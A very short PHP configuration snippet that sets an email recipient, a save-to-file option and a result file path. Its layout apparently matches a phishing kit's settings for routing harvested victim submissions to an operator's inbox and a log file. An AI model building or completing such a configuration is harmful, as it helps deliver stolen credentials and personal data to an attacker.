<?php
// One Email
$TO = "160688aaa@gmail.com";
// Save result to file   True or False
$Res2File = true;
//Result File Name
$ResFileName = "../Result.txt";
